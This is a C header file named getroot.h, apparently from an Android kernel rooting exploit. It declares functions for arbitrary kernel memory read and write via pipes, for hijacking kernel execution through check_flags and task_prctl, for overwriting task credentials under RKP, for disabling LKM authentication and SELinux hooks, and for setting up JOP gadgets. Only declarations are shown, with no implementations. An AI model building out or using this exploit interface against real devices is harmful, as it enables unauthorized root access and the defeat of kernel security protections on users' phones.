#ifndef GETROOT_H
#define GETROOT_H

#include "offsets.h"
#include "threadinfo.h"

int read_at_address_pipe(void* address, void* buf, ssize_t len);
int write_at_address_pipe(void* address, void* buf, ssize_t len);
inline int writel_at_address_pipe(void* address, unsigned long val);
unsigned int execute_via_check_flags(int dev, void* check_flags, void* function, unsigned long arg);
unsigned long execute_via_task_prctl(struct offsets* o, void* function, int arg0, unsigned long long arg1, unsigned long long arg2, unsigned long long arg3, unsigned long long arg4, unsigned long long arg5);
int modify_task_cred_rkp(struct thread_info* info);
int disable_lkmauth(struct offsets *o);
int disable_selinux_hooks(struct offsets *o);
void preparejop(void** addr, void* jopret);

#define MMAP_START ((void*)0x40000000)
#define MMAP_SIZE (0x1000)
#define MMAP_BASE(i) (MMAP_START + (i) * MMAP_SIZE)

#endif /* GETROOT_H */
